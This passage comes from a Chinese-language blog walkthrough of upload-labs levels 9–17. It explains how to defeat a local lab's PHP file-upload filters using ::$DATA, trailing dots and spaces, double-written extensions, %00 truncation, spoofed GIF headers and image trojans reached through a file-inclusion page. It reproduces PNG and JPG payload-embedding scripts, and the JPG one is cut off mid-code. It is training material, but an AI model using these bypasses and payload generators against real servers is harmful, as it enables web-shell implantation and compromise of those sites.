src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106165058.png"></p><p>这关在文件名后面加上<code>::$data</code>，构成<code>xx.php::$data</code>即可。（蚁剑连接的时候删掉后面的::$data)</p><p>这同样是针对windos系统特性的方法。</p><p>如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，这项操作的目的就是使windows主机不检查后缀名。</p><h3 id="10–黑名单之忽略后缀型-（2）"><a href="#10–黑名单之忽略后缀型-（2）" class="headerlink" title="10–黑名单之忽略后缀型.（2）"></a>10–黑名单之忽略后缀型.（2）</h3><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220124222313.png"></p><p>提醒：<strong>这部分我写的有点多，其实只要仔细分析源码就会明白了。</strong></p><p>这关的限制函数可以说是最全面了，前面几关没有的函数它都有了，但我们可以针对源码构造<code>xx.php. .</code>绕过。</p><p>根据源码，首先创建一个变量等于文件名<code>xx.php. .</code>，然后去除末尾的点，变为<code>xx.php.空格</code>再创建一个变量等于其从右往左第一个点后面的值，即为<code>.空格</code>，转为小写，不变，去除<code>::$DATA</code>，不变，去除空格，变为了<code>.</code>，这不会与黑名单中的<code>.xx</code>匹配。但显然这个结果<code>.</code>是不可能作为后缀使得文件解析成php的。</p><p>因为如果按照前几关的源码，在服务中会被储存为<code>xx.</code>，整个后缀都没有了，连php字段都丢掉了。事实上在6、7和9关上传<code>xx.php. .</code>文件的确只会得到这个结果。</p><p>而第十关不同点在这里：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220124223928.png"></p><p>（顺便贴一下6、7和9关以作对比）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/image-20220124223950733.png"></p><p>区别就在$img_path，这也就是服务器储存的文件名。一个是上传路径+结合时间的随机数字+转化后的后缀（只体现了变量$file_ext的转化），一个是上传路径+原文件名（也就是只体现了变量 $file_name所经过的转化 ，不体现变量$file_ext的转化）</p><p>也就是说对于第10关，网站的防御做了以下行为：</p><p>去除文件名后空格，去除文件后面的点，经过这两步转化后的原文件名作为变量 <code>$file_name </code>，我们把这个变量放在一旁暂且不管。</p><p>然后截取了我们上传的文件后缀，对其进行了一系列转化（转小写，去空格….），作为新后缀进行黑名单匹配，通过检测并成功上传后，服务器中存储的文件名就是我们所构造的文件名(只做了两步转化，不是后面后缀经历的转化),即之前得到的变量 <code>$file_name </code>。而后缀转化成了什么样子根本没关注了，只需要通过黑名单检测即可。</p><p>我们构造的<code>xx.php. .</code>，经过两步转化在服务器端的就储存成了<code>xx.php.空格  </code>。又因为windos的特性，文件后面的空格和点都会被忽略变成了<code>xx.php</code>，即可被执行。</p><p>而6、7和9关中，我们所关心的后缀变成了转化后的<code>.</code>，所以拼接的时候是xxx+一个点，是没有后缀php的，也就解析不了。</p><p>相比之下6、7和9在<code> $img_path</code> 这里的储存更为严格，生成一个新的文件名，使用通过黑名单检测的后缀来作为后缀储存，而第10关只要截取的后缀通过了黑名单检测，就直接使用整个原文件名（只经过了两步的转化）来储存。</p><p>第10关就是利用这一点，构造出<code>xx.php. .</code>使得截取出一个假后缀<code>.</code>来通过黑名单检测，而其原文件名（经过一两步转化）又能被解析为php文件。</p><h3 id="11–黑名单之双写"><a href="#11–黑名单之双写" class="headerlink" title="11–黑名单之双写"></a>11–黑名单之双写</h3><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211106174416.png"></p><p>上面函数的意思是，若文件后缀中带有$deny_ext数组中的值，则会被替换为空，构造<code>xx.pphphp. .</code>，双写绕过。</p><p>可以看出这一个限制函数的出发点与之前不同，前面的关卡都是先用函数截取后缀，对你的文件后缀进行一些转化，然后进行黑名单匹配，如果匹配到了就拒绝上传，这里是没有用函数截取后缀，先直接对整个文件名（包括后缀）进行黑名单匹配，如果匹配到了就修改为空。（你都匹配到了为什么不直接拒绝上传啊🤔是怕误伤文件名带有php的嘛..）</p><h3 id="12–-00截断之get类型"><a href="#12–-00截断之get类型" class="headerlink" title="12–%00截断之get类型"></a>12–%00截断之get类型</h3><p>先看源码，这关变成了白名单限制，先定义了白名单内容jpg，png，gif，然后截取文件名最后一个点后面的所有内容（截取文件后缀），接着用函数判断文件后缀是否在白名单中，符合条件即上传。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220111230241.png"></p><p>突破的关键在于这一条语句:</p><p><code> $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></p><p>意思为将图片的储存地址设置为“save_path”+”/“+一个随机数+date+文件后缀。注意到这个”save_path”是用get方式请求得到的参数，结合这关的提示，我们可推测这关”save_path”即上传路径，且可以修改。即虽然我们无法在文件名上突破，但我们可以通过修改save_path这个参数来上传php文件。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220111233039.png"></p><p>在浏览器窗口中我们可以看到”save_path”的参数在这里<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220125095622.png"></p><p>在数据包中我们可以看到”save_path”的参数在这里</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220111234431.png"></p><p>这里就需要利用到文件上传中的一个技术——“%00”截断。</p><p>需要注意的是，%00截断还有这两个要求；<br>（1）php版本必须小于5.3.4<br>（2）php的配置文件php-ini中，magic_quotes_gpc设置为Off</p><p>如果我们将这个”save_path”改为<code>../upload/shell.php%00</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220112002446.png"></p><p>即可实现上传php文件。</p><p>这项操作的原理就是，当拼接<code>save_path</code>与其它内容后，中间夹杂着<code>%00</code>，GET方式的<code>%00</code>会被服务器进行URL解码成<code>0x00</code>，而最后移动该文件储存时，会把其视为截止符，像汇编和c语言的规则一样。后面的内容被忽略，文件保留成xx.php。</p><p>（下图即为源码中移动文件的代码）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220112000953.png"></p><p>即save_path先被修改为<code>../upload/xx.php%00</code>，与其它东西拼接后形成了$img变量：<code>/upload/xx.php%00</code>+一段函数生成的数字（用来拼接的东西），而最后移动文件到该路径时，该路径被当作了：<code>/upload/xx.php</code>，%00后面的内容被忽略，最终我们成功上传的文件路径为<code>xx.php</code>，达成目的。</p><p>(可以看到文件最终被储存为了a.php)</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220112002011.png"></p><h3 id="13–-00截断之post类型"><a href="#13–-00截断之post类型" class="headerlink" title="13–%00截断之post类型"></a>13–%00截断之post类型</h3><p>这关我们的目的仍是在<code>save_path</code>，加上一个<code>0x00</code>。这关与第12关的区别就是<code>save_path</code>这个参数是用post类型来请求的，get与post一大区别就是浏览器会对get请求的数据进行url解码，而对post类型的数据不会。因为get类型的自动解码我们上传的是%00，而在上传post类型时我们添加的%00需要进行手动url解码，或是在二进制中进行修改<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220125104533.png"></p><p>下面展示的是在数据包中对<code>save_path</code>后添加截断符</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220125102524.png"></p><p>先添加%00，接着选中%00然后对其进行url解码</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220125102613.png"></p><p>得到的<code>0x00</code>字符不会显示出来</p><p>上传成功后我们复制图片链接地址会得到这样的数据</p><p><code>http://192.168.111.145/upload-labs-master/upload/eggs.php%EF%BF%BD/6820220125102724.jpg</code></p><p>其中<code>%EF%BF%BD</code>URL编码后的结果，后面的数字是源码中拼接文件路径时添加的内容。事实上,在这里我们上传的文件在服务器被储存为了<code>egg.php</code>，其之后的内容被截断了。用蚁剑链接时也是去掉后面的内容即可。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220125103453.png"></p><h3 id="14–图片马之文件头检查"><a href="#14–图片马之文件头检查" class="headerlink" title="14–图片马之文件头检查"></a>14–图片马之文件头检查</h3><p>在14~17关中，我们通关上传图片马来达到上传木马文件的目的。与之前的不同，虽然关卡一直要求我们上传图片文件，但之前我们本质都是上传的包含木马的php文件，可以直接被服务器当作php代码执行的php文件。</p><p>而这里我们上传的是“具有图片格式”的图片，是不能直接被服务器当作php代码执行的。所以当我们上传了图片马后往往还需要利用另一个漏洞——文件包含漏洞，在作者所强调的第二点这里可以看到。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220208154545.png"></p><p>文件包含漏洞：被<code>include</code> 和<code>require </code>函数引用的文件会被当作php文件来执行，当该文件含有恶意代码时即可造成危险。所以当我们成功上传了包含php代码的图片时，可以利用这个漏洞来执行。下面是这关中关于该漏洞的代码部分。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220208154652.png"></p><p>本关源码</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220217090345.png"></p><p>代码检查了文件的的前两个字节，现对数据包作如下修改：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220217091657.png"></p><p>在这里添加gif98a,使其判断为gif文件。这样我们就成功在服务器端上传了一个gif类型的包含php代码的文件。</p><p>然后是我们利用文件包含漏洞的步骤：复制图片链接，然后根据指示跳转到文件包含漏洞界面，通过源码得知参数为<code>file</code>，在该页面url<code>.../include.php</code>处添加图片地址，根据其相对文件路径保留只upload后面的部分。完整url:<code>192.168.191.129/upload-labs-master/include.php?file=upload/2220220330210320.png</code>，用蚁剑连接时也用这个地址</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220330210431.png"></p><p>下面是上传phpinfo()函数的实验结果。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220217083359.png"></p><p>下面是另一种方法，利用cmd命令把php指令和一张常规图片合成一张新的图片，自然就得到了包含php木马的图片文件，检查文件头时符合要求，被当作php代码执行时也能发挥作用。</p><p>制作图片马：cmd cd /d切换工作目录到 进入图片所在路径</p><p>输入指令<code>copy egg.jpg/b+shell.php/a shell.jpg</code></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220217073313.png"></p><p>有时新生成的图片能够正常打开而有时不能，经过我的测试这里中能正常打开的图片似乎不能使其中的php代码发挥作用。不过我看到别人的博客中是成功了的。我个人猜测可能是因为新生成的图片虽然包含了完整的php代码，但原本图片的数据残留使得php语法产生冲突导致php代码无法生效。</p><p>另外经过我的测试，执行<code> copy  x + y z</code>这个命令时，x如果是图片则z可以作为图片打开，y如果是图片则z不能作为图片打开。</p><p>其中/b是指以二进制方式打开，/a是以ascii方式打开，shell.jpg即为生成的图片马，在这张图片中藏有php代码，如果将该文件当作php代码执行即可实现其后门作用。</p><p>（也可以上传正常图片，同时用burpsuite抓包后直接在数据后添加php代码，这样也是在服务器端上传了一个包含php代码的图片马，此方法不再赘述。）</p><h3 id="15–图片马之getimagesize"><a href="#15–图片马之getimagesize" class="headerlink" title="15–图片马之getimagesize()"></a>15–图片马之getimagesize()</h3><p>这关提示我们使用了<code>getimagesize()</code>来检查是否是图片。<code>getimagesize()</code>的作用是读取目标图片的大小。即我们上传的图片需要具有图片“大小”的这个属性。而上一关中用cmd合成图片马可以得到正常打开的图片，即具备这样的属性。但就像上一关末尾我提到的一样，我个人尝试后一直不行。结合我之前的猜想，也许因为图片太复杂导致合成的图片数据太多影响php代码的生效。于是我截了个像素为60×60的图，以此代替之前的caat.jpg来作为合成图片木马的素材。·下面是两图属性对比。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220219233420.png"></p><p>重复之前的步骤，即合成，上传，访问漏洞页面</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220219233517.png"></p><p>竟然成功了。</p><h3 id="16–图片马之exif-imagetype"><a href="#16–图片马之exif-imagetype" class="headerlink" title="16–图片马之exif_imagetype()"></a>16–图片马之exif_imagetype()</h3><p>这关提示我们使用了exif_imagetype()函数来检查图片，该函数读取图像的第一个字节并检查其签名，用于确定图片类型。同样可以利用前文提到的cmd合成的图片马。根据前几次的经验，我总结出<strong>在cmd窗口使用copy命令合成图片时,前一位为图片且图片像素不宜过高。</strong></p><p>另外这关需要先在php配置文件（php.ini）中开启有关php_exif的设置。</p><p>重复之前步骤，成功。  </p><h3 id="17–图片马之二次渲染"><a href="#17–图片马之二次渲染" class="headerlink" title="17–图片马之二次渲染"></a>17–图片马之二次渲染</h3><p>二次渲染就是服务器会根据我们上传的图片再生成一张图片来储存。我们上传的原图片马末尾是有php代码的，而服务器对该图片进行二次渲染生成后，新生成图片的php代码是会被破坏掉的，且不同类型的图片二次渲染的方式不一样。其中gif的二次渲染绕过比较简单，用16进制的编辑器分别打开原图片木马和二次渲染后新生成的图片，找出其中一样的地方，然后把php代码写在这里即可。</p><p>详细步骤：</p><p>上传GIF图片，并再下载上传后的图片。</p><p>然后用16进制编辑器打开这两张图片(我这里用的是winhex)，找到一片数据相同处</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220223214931.png"></p><p>将php代码插在中间</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220223215711.png"></p><p>重新上传，验证</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220223215759.png"></p><p>而png和jpg的有些复杂，不过都可以利用别人写好的脚本来实现绕过，详见：<a href="https://xz.aliyun.com/t/2657">upload-labs之pass 16详细分析 - 先知社区 (aliyun.com)</a></p><p><em>PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们。</em></p><p><em>IDAT:<br>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。<br>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像</em></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//png制作脚本，原理：写入IDAT数据块</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; sizeof(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = imagecolorallocate(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   imagesetpixel(<span class="hljs-variable">$img</span>, round(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br>imagepng(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//jpg制作脚本</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by php functions imagecopyresized() and imagecopyresampled().</span><br><span class="hljs-comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    1) Upload an arbitrary image via secured files upload script</span><br><span class="hljs-comment">    2) Save the processed image and launch:</span><br><span class="hljs-comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="hljs-comment">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="hljs-comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="hljs-comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    See also:</span><br><span class="hljs-comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;<br><br><br>    <span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;gd&#x27;</span>) || !function_exists(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    set_error_handler(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = file_get_contents(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readShort() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;readByte() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;readByte();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;readShort() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;skip(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek();<br>                <span class="hljs-variable">$outStreamTmp</span> = <br>                    substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                    <span class="hljs-variable">$miniPayload</span> . <br>                    str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>                    substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                checkImage(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> = <br>                        substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                        <span class="hljs-variable">$miniPayload</span> . <br>                        substr(<br>                            str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                                substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>                                substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(checkImage(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    unlink(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span 